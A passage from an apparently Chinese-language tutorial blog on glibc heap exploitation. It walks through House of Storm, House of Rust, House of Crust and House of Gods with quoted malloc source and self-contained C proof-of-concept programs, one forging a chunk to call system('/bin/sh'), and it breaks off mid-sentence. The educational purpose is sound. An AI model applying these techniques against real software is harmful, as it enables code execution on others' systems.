<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">	errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/14c140819bdb4f2c84a6b4bcb6159898.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                ></p></li>
<li><p>两次申请 chunk 即可获得 buf1 处的 chunk 。 # House of Storm
unsorted bin attack 能够通过将目标地址链入 unsorted bin
然后取出其中另一个 chunk 从而在目标地址对应的 bk 写入
<code>unsorted_chunks (av)</code> ，然而如果我们想要将链入 unsorted bin
的 fake chunk 申请出来却通不过检查。这就需要利用 large bin 的特性伪造
fake chunk 的 size 和 fd 字段。这种攻击方式称为 House of storm 。
漏洞利用条件:</p></li>
</ol>
<ul>
<li>需要攻击者在 largebin 和 unsorted_bin 中分别布置一个 chunk 这两个
chunk 需要在归位之后处于同一个 largebin 的 index 中且 unsortedbin 中的
chunk 要比 largebin 中的大。</li>
<li>需要 unsorted_bin 中的 bk 指针可控。</li>
<li>需要 largebin 中的 bk 指针和 bk_nextsize 指针可控。</li>
</ul>
<p>下面举一个实际例子： <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc -ggdb -fpie -pie -o house_of_storm house_of_storm.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">char</span> chunk_head[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">char</span> content[<span class="number">0x10</span>];</span><br><span class="line">&#125; fake;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *large_bin, *unsorted_bin;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *fake_chunk;</span><br><span class="line">    <span class="type">char</span> *ptr;</span><br><span class="line"></span><br><span class="line">    unsorted_bin = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0X18</span>);</span><br><span class="line">    large_bin = <span class="built_in">malloc</span>(<span class="number">0x408</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(large_bin);</span><br><span class="line">    <span class="built_in">free</span>(unsorted_bin);</span><br><span class="line">    unsorted_bin = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="built_in">free</span>(unsorted_bin);</span><br><span class="line"></span><br><span class="line">    fake_chunk = ((<span class="type">unsigned</span> <span class="type">long</span>) fake.content) - <span class="number">0x10</span>;</span><br><span class="line">    unsorted_bin[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>) fake_chunk;</span><br><span class="line"></span><br><span class="line">    large_bin[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>) fake_chunk + <span class="number">8</span>;</span><br><span class="line">    large_bin[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>) fake_chunk - <span class="number">0x18</span> - <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(ptr, <span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0x48</span> - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(fake.content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 首先进行如下修改：
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d7893a21262ab86ca0569abd25395d2c.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                ></p>
<p>当申请 0x48 大小的内存时，会先遍历 unsorted bin 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ((victim = <span class="built_in">unsorted_chunks</span>(av)-&gt;bk) != <span class="built_in">unsorted_chunks</span>(av))</span><br></pre></td></tr></table></figure></div>
<p>由于倒序遍历 unsorted bin 时取最后的 chunk 是根据
<code>unsorted_chunks(av)-&gt;bk</code> 取的，因此先访问的是 0x418
大小的 chunk 。 因为不满足下面这个判断，因此不会从该 chunk 上切下合适的
chunk ，而是将其放入 large bin 中。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">in_smallbin_range</span>(nb) &amp;&amp;</span><br><span class="line">    bck == <span class="built_in">unsorted_chunks</span>(av) &amp;&amp;</span><br><span class="line">    victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br></pre></td></tr></table></figure></div>
<p>在放入 large bin 中之前，先要将其从 unsorted bin
中取出，这就完成了一次 unsorted bin attack 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">unsorted_chunks</span>(av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = <span class="built_in">unsorted_chunks</span>(av);</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/862cd92cc549f568a59728aee8973321.png"
                      alt="在这里插入图片描述" style="zoom: 25%;" 
                ></p>
<p>由于取出的 chunk 大小不在 small bin 范围，所以将放入 large bin 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">in_smallbin_range</span>(size)) &#123;</span><br><span class="line">	...</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>判断 large bin 是否为空，这里显然不为空。 <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">victim_index = <span class="built_in">largebin_index</span>(size);</span><br><span class="line">bck = <span class="built_in">bin_at</span>(av, victim_index);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line">	...</span><br><span class="line">&#125; <span class="keyword">else</span> ...</span><br></pre></td></tr></table></figure></div> large bin
中的 chunk 是按大小降序排列。首先特判大小小于最小的 chunk
的情况。这里通过 <code>bk</code> 访问最小的 chunk
，根据事先的构造，待加入 large bin 的 chunk 大于 large bin 中最小的
chunk ，因此执行的是 else 里的内容。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size)) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">assert</span>((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);<span class="comment">//默认不启用assert</span></span><br><span class="line">    <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">        fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">        <span class="built_in">assert</span>((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">        fwd = fwd-&gt;fd;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        victim-&gt;fd_nextsize = fwd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">        fwd-&gt;bk_nextsize = victim;</span><br><span class="line">        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    bck = fwd-&gt;bk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>large bin 对 fake chunk 进行了如下修改，伪造了 size 和 bk 字段。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/1bc5ed03a57d61aa9cbee334cc831e76.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>因为在<strong>开启 PIE</strong> 之后 chunk 的地址多为 0x55 和 0x56
开头，且长度为 6 字节，因此刚好在 size 字段中截取出合适的数值。
<code>__int_malloc</code> 在拿到 chunk 后返回到
<code>__libc_malloc</code> ，<code>__libc_malloc</code> 会对 chunk
的进行检查。 - 如果 size 为 0x55 那么 <code>IS_MAPPED</code>
没有置位，会判断 <code>arena_for_chunk(mem2chunk(victim))</code> 。由于
<code>NON_MAIN_ARENA</code> 置位导致计算出的 <code>arena</code> 不是
<code>main_arena(ar_ptr)</code> 因此通不过检查。 - 如果 size 为 0x56
那么 <code>IS_MAPPED</code> 置位可以通过检查。 <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">assert</span>(!victim || <span class="built_in">chunk_is_mmapped</span>(<span class="built_in">mem2chunk</span>(victim)) </span><br><span class="line">       || ar_ptr == <span class="built_in">arena_for_chunk</span>(<span class="built_in">mem2chunk</span>(victim)));</span><br></pre></td></tr></table></figure></div></p>
<p>之后继续遍历 unsorted bin 于是便将 fake chunk 申请出来。</p>
<p>glibc-2.27 加入 tcache，此时是先遍历 unsorted bin，即使找到合适的
chunk 也会放入 tcache 然后继续遍历，因此还会触发报错。因此需要先将
tcache 填满，并且最后通过 <code>calloc</code> 申请触发 house of storm
。</p>
<p>glibc-2.28 开始 unsorted bin 会有如下检查： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br></pre></td></tr></table></figure></div></p>
<p>glibc-2.30 开始 large bin 会有下面这条检查 <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">  <span class="built_in">malloc_printerr</span> (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure></div>
因此此方法失效。 # House of Rust 该技巧就是 tcachebin stash unlinking +
largebin attack 的组合技巧。</p>
<p>该利用方法的主要步骤如下： - 把 <code>tcachebin[0x90]</code> 填满，把
<code>smallbin[0x90]</code> 也填满。</p>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108031734130.png"
                     
alt="image-20241108031734130" 
                >
<figcaption aria-hidden="true">image-20241108031734130</figcaption>
</figure>
<ul>
<li><p>把最后一个 smallbin 0x90 的 chunk 的 <code>size</code> 改成
0xb0，将其释放到 <code>tcachebin[0xb0]</code>，这一步主要是为了改变其
<code>bk</code> 指向
<code>tcache_perthread_struct</code>，可以部分修改低位的字节，以便下一步分配到目标区域。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a459435d702e55e5ee364d57cc7e23da.png"
                     
alt="在这里插入图片描述" 
                ></p></li>
<li><p>使用 largebin attack 往上一步的 <code>bk-&gt;bk</code>
写一个合法地址。（新版本的 Large Bin Attack 需要泄露
<code>tcache_perthread_struct</code> 的地址） <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c5faef0f5fb2ddd93fd28b974ca22ab1.png"
                     
alt="在这里插入图片描述" 
                ></p></li>
<li><p>耗尽 <code>tcachebin[0x90]</code>，再分配的时候就会触发 tcache
stash unlink，之后就能分配到 <code>tcache_perthread_struct</code>
结构体。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/51fb7345e938cd79dfef912f6f3f659e.png"
                     
alt="在这里插入图片描述" 
                ></p></li>
<li><p>利用 tcache stash unlink 在 <code>tcache_perthread_struct</code>
上写一个 libc 地址。</p></li>
<li><p>通过控制 <code>tcache_perthread_struct</code>
结构体，部分写上面的 libc 地址，分配到 stdout
结构体，泄露信息。</p></li>
<li><p>通过控制 <code>tcache_perthread_struct</code>
结构体分配到任意地址。</p></li>
</ul>
<p>这里 <a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_rust" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
只实现了劫持 <code>tcache_perthread_struct</code>
，后续利用需要根据实际情况进行。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TCACHE_NUM 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALL_NUM 7</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">void</span> *tcache_chunk[TCACHE_NUM];</span><br><span class="line">    <span class="type">size_t</span> *small_chunk[SMALL_NUM];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TCACHE_NUM; i++) &#123;</span><br><span class="line">        tcache_chunk[i] = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SMALL_NUM; i++) &#123;</span><br><span class="line">        small_chunk[i] = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TCACHE_NUM; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunk[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SMALL_NUM; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(small_chunk[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(<span class="built_in">malloc</span>(<span class="number">0x500</span>));</span><br><span class="line">    small_chunk[SMALL_NUM - <span class="number">1</span>][<span class="number">-1</span>] = <span class="number">0xb1</span>;</span><br><span class="line">    <span class="built_in">free</span>(small_chunk[SMALL_NUM - <span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> tcache_perthread_struct = small_chunk[SMALL_NUM - <span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] tcache_perthread_struct: %p\n&quot;</span>, tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *large_chunk = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="type">void</span> *unsorted_chunk = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(large_chunk);</span><br><span class="line">    <span class="built_in">free</span>(<span class="built_in">malloc</span>(<span class="number">0x500</span>));</span><br><span class="line">    large_chunk[<span class="number">3</span>] = tcache_perthread_struct - <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">free</span>(unsorted_chunk);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TCACHE_NUM; i++) &#123;</span><br><span class="line">        tcache_chunk[i] = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] hijack tcache_perthread_struct: %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x88</span>));</span><br><span class="line"></span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>glibc-2.34 之后，<code>tcache_key</code> 是一个随机数，不是
<code>tcache_perthread_struct</code> 了。</p>
<p>所以，此时可以加上 largebin attack，把以上的第二步变为：继续用
largebin attack 向其 <code>bk</code> 写一个堆地址，然后还要部分写
<code>bk</code> 使其落在 <code>tcache_perthread_struct</code>
区域。其他步骤一样。</p>
<p>或者，在 smallbin 里面放 9 个，这样第 8 个的 <code>bk</code>
肯定就是一个堆地址。此时就需要爆破 1/16 的堆，1/16 的 glibc
地址，成功的概率是 1/256。 # House of Crust 在 House of Rust
的基础上修改 <code>global_max_fast</code> 然后借助 House of Corrosion
完成后续利用。 # House of Gods <code>main_arena</code> 中有一个记录 bins
中是否有空闲 chunk 的结构 <code>binmap</code> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<code>binmap</code> 只有在 malloc 过程中的下面两个场景会被修改： -
在遍历 unsorted bin 中的空闲 chunk 时如果将该 chunk 放入对应的 small bin
或 large bin 中会在 <code>binmap</code> 对应位置置位。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">mark_bin(av, victim_index);</span><br><span class="line"></span><br><span class="line">定义:  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mark_bin(m, i) ((m)-&gt;binmap[idx2block(i)] |= idx2bit(i))</span></span><br><span class="line">替换:  </span><br><span class="line">((av)-&gt;binmap[((victim_index) &gt;&gt; <span class="number">5</span>)] |= ((<span class="number">1U</span> &lt;&lt; ((victim_index) &amp; ((<span class="number">1U</span> &lt;&lt; <span class="number">5</span>) - <span class="number">1</span>)))))</span><br></pre></td></tr></table></figure></div> -
在遍历 small bin + large bin 找大小不小于当前 chunk 的空闲 chunk
时如果对应 <code>binmap</code> 置位的 bin 是空闲的就将对应位置复位。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit;</span><br></pre></td></tr></table></figure></div> 因此如果我们释放一个 0xa0 大小的 chunk 到 small bins
就可以将 binmap 中的第 9 比特置位，此时我们将 <code>binmap</code>
当做一个 0x200 大小的 chunk，则 <code>bk</code> 对应
<code>main_arena</code> 的 <code>next</code> ，<strong>而
<code>main_arena</code> 的 <code>next</code> 指向
<code>main_arena</code> 。</strong> <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">                                     [1]        [0]</span><br><span class="line">0x00007ffff7dd3450 00007ffff7dd3438 0000000000000200 &lt;- binmap[0, 1] (fake sizefield)</span><br><span class="line">0x00007ffff7dd3460 0000000000000000 00007ffff7dd2c00 &lt;- next (fake bk pointer)</span><br><span class="line">0x00007ffff7dd3470 0000000000000000 0000000000000001</span><br><span class="line">0x00007ffff7dd3480 0000000000021000 0000000000021000 &lt;- system_mem, max_system_mem</span><br></pre></td></tr></table></figure></div> 因此可以用如下方法把
<code>binmap</code> 以及后面的部分申请出来。</p>
<p>首先做如下构造： - 由于之前释放一个 0xa0 大小的 chunk 到 small bin
中导致 <code>binmap</code> 前 8 字节为 0x200 。 - <code>FAST40</code> 的
<code>bk</code> 在释放前写入 <code>INTM</code> 的地址。 - 释放一个 0x20
大小的 chunk 确保 <code>main_arena</code> 所在的 fake chunk 的
<code>size</code> 大于 <code>2 * SIZE_SZ</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d6f6ed6475a36c756b54f2aee4b5c758.png"
                     
alt="在这里插入图片描述" 
                > 之后 UAF 修改 <code>SMALLCHUNK</code> 的
<code>bk</code> 字段指向 <code>&amp;main_arena.bins[253]</code>
，结果如下图所示： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/18d10f0508ac8917c5ebe7a36610e62e.png"
                     
alt="在这里插入图片描述" 
                > 此时 unsorted bin 中有如下结构：
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">head -&gt; SMALLCHUNK -&gt; binmap -&gt; main-arena -&gt; FAST40 -&gt; INTM</span><br><span class="line">     bk            bk        bk            bk        bk</span><br></pre></td></tr></table></figure></div> 我们如果 <code>malloc(0x1f8)</code> 就会把
<code>binmap</code> 所在的 fake chunk 申请出来，我们称这个 fake chunk 为
<code>BINMAP</code> 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c0e5a050c9b8834d034a4051c1ff881d.png"
                     
alt="在这里插入图片描述" 
                > 之后我们考虑通过如何把 <code>arena</code>
切换到 伪造的 <code>arena</code> 上。</p>
<p>在 <code>__libc_malloc</code> 上，我们通过 <code>arena_get</code>
来获取 <code>arena</code> 。由于 <code>arena</code> 的
<code>flags</code> 的值一般为 0 ，因此将宏展开后发现实际上是获取的
<code>thread_arena</code> 的值。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">    arena_get(ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">定义:  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_get(ptr, size)   \</span></span><br><span class="line"><span class="meta">    do &#123;                       \</span></span><br><span class="line"><span class="meta">        ptr = thread_arena;    \</span></span><br><span class="line"><span class="meta">        arena_lock(ptr, size); \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br><span class="line">替换:  </span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    ar_ptr = thread_arena;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (ar_ptr &amp;&amp; !(((ar_ptr)-&gt;flags &amp; (<span class="number">4U</span>)))) (<span class="type">void</span>) (&#123;(<span class="type">void</span>)(&#123;<span class="type">int</span> ignore1,ignore2,ignore3;<span class="keyword">if</span>(__builtin_constant_p(<span class="number">0</span>)&amp;&amp;(<span class="number">0</span>)==<span class="number">0</span>)__asm __volatile(<span class="string">&quot;cmpl $0, __libc_multiple_threads(%%rip)\n\t&quot;</span> <span class="string">&quot;je 0f\n\t&quot;</span> <span class="string">&quot;lock; cmpxchgl %4, %2\n\t&quot;</span> <span class="string">&quot;jnz 1f\n\t&quot;</span> <span class="string">&quot;jmp 24f\n&quot;</span> <span class="string">&quot;0:\tcmpxchgl %4, %2\n\t&quot;</span> <span class="string">&quot;jz 24f\n\t&quot;</span> <span class="string">&quot;1:\tlea %2, %%&quot;</span> <span class="string">&quot;rdi&quot;</span> <span class="string">&quot;\n&quot;</span> <span class="string">&quot;2:\tsub $128, %%&quot;</span> <span class="string">&quot;rsp&quot;</span> <span class="string">&quot;\n&quot;</span> <span class="string">&quot;.cfi_adjust_cfa_offset 128\n&quot;</span> <span class="string">&quot;3:\tcallq __lll_lock_wait_private\n&quot;</span> <span class="string">&quot;4:\tadd $128, %%&quot;</span> <span class="string">&quot;rsp&quot;</span> <span class="string">&quot;\n&quot;</span> <span class="string">&quot;.cfi_adjust_cfa_offset -128\n&quot;</span> <span class="string">&quot;24:&quot;</span>:<span class="string">&quot;=S&quot;</span>(ignore1),<span class="string">&quot;=&amp;D&quot;</span>(ignore2),<span class="string">&quot;=m&quot;</span>(*(&amp;ar_ptr-&gt;mutex)),<span class="string">&quot;=a&quot;</span>(ignore3):<span class="string">&quot;0&quot;</span>(<span class="number">1</span>),<span class="string">&quot;m&quot;</span>(*(&amp;ar_ptr-&gt;mutex)),<span class="string">&quot;3&quot;</span>(<span class="number">0</span>):<span class="string">&quot;cx&quot;</span>,<span class="string">&quot;r11&quot;</span>,<span class="string">&quot;cc&quot;</span>,<span class="string">&quot;memory&quot;</span>);<span class="keyword">else</span> __asm __volatile(<span class="string">&quot;cmpl $0, __libc_multiple_threads(%%rip)\n\t&quot;</span> <span class="string">&quot;je 0f\n\t&quot;</span> <span class="string">&quot;lock; cmpxchgl %4, %2\n\t&quot;</span> <span class="string">&quot;jnz 1f\n\t&quot;</span> <span class="string">&quot;jmp 24f\n&quot;</span> <span class="string">&quot;0:\tcmpxchgl %4, %2\n\t&quot;</span> <span class="string">&quot;jz 24f\n\t&quot;</span> <span class="string">&quot;1:\tlea %2, %%&quot;</span> <span class="string">&quot;rdi&quot;</span> <span class="string">&quot;\n&quot;</span> <span class="string">&quot;2:\tsub $128, %%&quot;</span> <span class="string">&quot;rsp&quot;</span> <span class="string">&quot;\n&quot;</span> <span class="string">&quot;.cfi_adjust_cfa_offset 128\n&quot;</span> <span class="string">&quot;3:\tcallq __lll_lock_wait\n&quot;</span> <span class="string">&quot;4:\tadd $128, %%&quot;</span> <span class="string">&quot;rsp&quot;</span> <span class="string">&quot;\n&quot;</span> <span class="string">&quot;.cfi_adjust_cfa_offset -128\n&quot;</span> <span class="string">&quot;24:&quot;</span>:<span class="string">&quot;=S&quot;</span>(ignore1),<span class="string">&quot;=D&quot;</span>(ignore2),<span class="string">&quot;=m&quot;</span>(*(&amp;ar_ptr-&gt;mutex)),<span class="string">&quot;=a&quot;</span>(ignore3):<span class="string">&quot;1&quot;</span>(<span class="number">1</span>),<span class="string">&quot;m&quot;</span>(*(&amp;ar_ptr-&gt;mutex)),<span class="string">&quot;3&quot;</span>(<span class="number">0</span>),<span class="string">&quot;0&quot;</span>(<span class="number">0</span>):<span class="string">&quot;cx&quot;</span>,<span class="string">&quot;r11&quot;</span>,<span class="string">&quot;cc&quot;</span>,<span class="string">&quot;memory&quot;</span>);&#125;);<span class="number">0</span>; &#125;);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            ar_ptr = arena_get2((bytes), ((<span class="type">void</span> *) <span class="number">0</span>));</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div> 在
<code>arena_get</code> 获取 <code>arena</code> 后会调用
<code>_int_malloc</code> 尝试申请内存，如果 <code>_int_malloc</code>
返回 NULL 则调用 <code>arena_get_retry</code> 和
